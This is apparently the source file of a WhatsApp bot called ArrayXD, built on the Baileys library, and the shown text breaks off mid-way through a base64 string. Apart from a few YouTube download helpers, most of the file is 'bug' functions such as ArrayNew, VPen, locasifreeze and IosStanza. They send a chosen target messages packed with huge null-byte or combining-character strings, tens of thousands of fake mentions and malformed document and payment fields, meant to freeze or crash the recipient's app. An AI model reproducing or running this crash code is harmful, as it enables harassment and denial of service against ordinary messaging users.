require('./setting/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const kripto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');
let { randomBytes } = require("crypto")
const ytdl = require('@vreden/youtube_scraper');
const yts = require("yt-search")
const makeid = randomBytes(3).toString('hex')

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = arrayxd = async (arrayxd, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? arrayxd.user.id.split(":")[0] || arrayxd.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./message/lib/database/owner.json'));
const author = "6289676226170";
const developerName = "ArrayXD";

const botNumber = await arrayxd.decodeJid(arrayxd.user.id);
const isBot = botNumber.includes(senderNumber)
const isAcces = [botNumber, ...kontributor, ...global.ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await arrayxd.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');

const YouTubeMp3 = async (Link, Quality = 128) => {
			try {
				if (!isUrl(Link)) return replyme("check your typing, it's wrong!")
				let data = await ytdl.ytmp3(Link, Quality);
				await arrayxd.sendMessage(m.chat, {
					audio: {
						url: data.download.url
					},
					mimetype: 'audio/mpeg',
					contextInfo: {
						forwardingScore: 9999999,
						isForwarded: true,
						externalAdReply: {
							title: `乂 YTMP3 - ${data.download.quality}`,
							body: data.metadata.title,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							thumbnailUrl: data.metadata.thumbnail,
							sourceUrl: Link
						}
					}
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command);
			}
		};

	
		// dll //
				const YouTubeMp4 = async (Link, Quality = 360) => {
			try {
				if (!isUrl(Link)) return replyme("where's the link?")
				let data = await ytdl.ytmp4(Link, Quality);
				const caption = `*${data.metadata.title}*

*⌬ Ext* : Download
*⌬ ID* : ${data.metadata.videoId}
*⌬ Duration* : ${data.metadata.timestamp}
*⌬ Upload* : ${data.metadata.ago}
*⌬ Views* : ${data.metadata.views}
*⌬ Quality* : ${data.download.quality}
*⌬ Channel* : ${data.metadata.author.name}

© ArrayXD `;

				await arrayxd.sendMessage(m.chat, {
					video: {
						url: data.download.url
					},
					caption: caption,
					gifPlayback: false
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command);
			}
		};

var ppuser
try {
ppuser = await arrayxd.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

let example = (teks) => {
return `*example :*\nwrite *${prefix+command}* ${teks}`
}

// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`❑ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
` ➤ Date: ${new Date().toLocaleString()} \n` +
` ➤ Message: ${m.body || m.mtype} \n` +
` ➤ Sender: ${m.pushname} \n` +
` ➤ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ➤ Group: ${groupName} \n` +
` ➤ GroupJid: ${m.chat}`
)
);
}
console.log();
}

// Function Bug

const TypeNull = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        
        const NullNihBos = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ArrayXD",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
        
async function ArrayNew(target) {
    let etc = generateWAMessageFromContent(target,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "",
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                fileName: "JinXzo - just wanna be yours",
                                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1723855952",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: `ArrayXD`,
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" i just wanna be yours \",\"body\":\"xxx\"}",
                            buttons: [
                                { 
                                    name: "single_select", 
                                    buttonParamsJson: `{"title":"𝐙͢͡𝐄𝐓̸ৄৄৄ𝐃͡𝐎͜𝐌͡𝐈𝐍͢𝐀̸𝐓̃𝐄${"ःऀँ⿆".repeat(60000)}","sections":[{"title":"𝐃̶̸͠𝐎͢𝐌͡𝐈𝐍͜𝐀𝐓͡𝐈͜𝐎̸𝐍 𝐎̷̎͢𝐅 𝐙͢͡𝐄͌̀͒𝐓͠ ⚗️","rows":[]}]}` 
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}",
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "{}",
                                },
                                { 
                                    name: "single_select",
                                    buttonParamsJson: `{"title":"𝐃̶̸͠𝐎͢𝐌͡𝐈𝐍͜𝐀𝐓͡𝐈͜𝐎̸𝐍 𝐎̷̎͢𝐅 𝐙͢͡𝐄͌̀͒𝐓͠ ⚗️","sections":[{"title":"anjay","rows":[]}]}`
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"KONTOLODON\",\"flow_message_version\":\"9\",\"flow_token\":\"DIEDIEDIEDIEDIEDIE\"}`,
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}",
                                }
                            ],
                        },
                    },
                },
            },
        }),
        { userJid: target, quoted: TypeNull }
    )

for (let i = 0; i < 5; i++) {
    await arrayxd.relayMessage(target, etc.message, { participant: { jid: target } })
    }
}

async function ArrayCarousel(target, NullNihBos, Ptcp = true) {
      const header = {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
        },
        hasMediaAttachment: true,
      };

      const body = {
        text: "ArrayXD" + "\u0000".repeat(90000),
      };

      const carouselMessage = {
        sections: [
          {
            title: " ϟ ",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".hell-king" },
              { title: " ϟ ", description: " ", rowId: ".hell-king" },
            ],
          },
          {
            title: "Section 2",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".hell-king" },
              { title: " ϟ ", description: " ", rowId: ".hell-king" },
            ],
          },
        ],
      };

      await arrayxd.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp ? { participant: { jid: target } } : { quoted: NullNihBos }
      );

      console.log(chalk.blue.bold("Array7 : Carousel Active!"));
    }
    
    const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			arrayxd.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

// The Bug Functions ! //
 // Ui Speciality //
 async function VPen(zLoc, ptcp = false) {
    let valhalla = "𝗔𝗿𝗿𝗮𝘆7" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let battanz = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Gateway To Hell"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: valhalla 
                        }]
                    }
                }
            }
        }
    };

    await arrayxd.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
		async function TanggapanDiterima(zLoc, Ptcp = true) {
			await arrayxd.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "𝗔𝗿𝗿𝗮𝘆7",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
		};
		
  async function uidoc(zLoc, ptcp = false) {
    let uitext = "𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙞" + "𑲭𑲭".repeat(50000);
    await arrayxd.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/pdf',
                            fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "unidentifiedMessageType",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xin x9 " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
    
    // Freeze Speciality //
     async function locasiV2(zLoc, ptcp = false) {
   let mark = '0@s.whatsapp.net';
    await arrayxd.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝗔𝗿𝗿𝗮𝘆7" + "@0".repeat(109999)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " 𝗔𝗿𝗿𝗮𝘆7 " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function locasifreeze(zLoc, ptcp = false) {
    await arrayxd.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝗔𝗿𝗿𝗮𝘆7" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝗔𝗿𝗿𝗮𝘆7" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze(zLoc, ptcp = false) {
    let uitext = "DikaDocu" + "*~@1~*".repeat(50000);
    await arrayxd.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                            fileSha256: "dnFCD9DtW/8seNK1KK9RFO/qR7ODsmBI/fkfkybi55s=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "flower",
                            fileEncSha256: "0IrI30eGq8SQ0KSAmUWpPFCr9CIvoZRC/0PFbulTsFU=",
                            directPath: "/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732511963",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze2(zLoc, ptcp = false) {
    let uitext = "𝗔𝗿𝗿𝗮𝘆7" +  "꧀ *~@1~*".repeat(50000);
    await arrayxd.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                            fileSha256: "7SXMgNYBO4tkPSk3W46FQ3hUcK6K6G3//TiB5/ibhwg=",
                            fileLength: "829710112",
                            pageCount: 0x9184e729fff,
                            mediaKey: "/gaasVF/Lt68CK4sy5DTRhJDQls+RwNDwU6yhGZjPCk=",
                            fileName: "@𝗔𝗿𝗿𝗮𝘆7💸",
                            fileEncSha256: "nRvyfj/ky0+6upJrQMnwtuXm6lye2RuavfYM+cVl0hU=",
                            directPath: "v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732537847",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function uidoc2(zLoc, ptcp = false) {
    let akumw = "~ArrayXD~" + "ꦿꦾ".repeat(50000);
    await arrayxd.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " X 🚀 ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Credits to xin bro " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function liveLokFreeze(zLoc, ptcp = false) {
        let virtex = "ꪶ𖣂ꫂ x𝗔𝗿𝗿𝗮𝘆7 厷"+"ꦾ".repeat(77777) + "@1".repeat(77777);
var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": virtex,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     },
     body: {
     text: virtex
     },
     nativeFlowMessage: {},
     contextInfo: {
     mentionedJid: ["6285805338638@s.whatsapp.net"],
     groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
     }
  }
}
}), { userJid: zLoc, quoted: m })
await arrayxd.relayMessage(zLoc, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id })
}

// Ios Speciality //
	async function IosPayM(zLoc, ptcp = false) {
			arrayxd.relayMessage(zLoc, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			});
		};
		
				async function IosStanza(zLoc, ptcp = false) {
			arrayxd.relayMessage(zLoc, {
				'extendedTextMessage': {
					'text': 'ArrayXD' + 'ꦾ'.repeat(35000),
					'contextInfo': {
						'stanzaId': zLoc,
						'participant': zLoc,
						'quotedMessage': {
							'conversation': '🌷 𝗔𝗿𝗿𝗮𝘆7' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			}, {
				'messageId': null
			});
		};
		
				async function IosCL(zLoc, ptcp = false) {
			await arrayxd.relayMessage(zLoc, {
					"extendedTextMessage": {
						"text": "𝗔𝗿𝗿𝗮𝘆7 ",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": zLoc,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAI